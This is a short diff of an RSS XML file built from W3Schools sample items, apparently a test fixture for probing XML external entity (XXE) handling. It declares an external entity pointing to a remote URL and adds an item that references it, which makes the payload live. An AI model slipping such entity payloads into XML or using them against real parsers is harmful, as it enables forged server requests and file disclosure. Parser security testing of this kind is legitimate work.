@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://grepular.com/xxe.txt" >]>
   <rss version="2.0">
-  <!--  <foo>&xxe;</foo>-->
     <channel>
       <title>W3Schools Home Page</title>
       <link>http://www.w3schools.com</link>
@@ -10,6 +9,12 @@
         <title>XML Tutorial</title>
         <link>http://www.w3schools.com/xml</link>
         <description>New XML tutorial on W3Schools</description>
+      </item>
+      <item>
+        <title>XML Tutorial</title>
+        <link>http://www.w3schools.com/xml</link>
+        <description>New XML tutorial on W3Schools</description>
+        <foo>&xxe;</foo>
       </item>
     </channel>
   </rss>
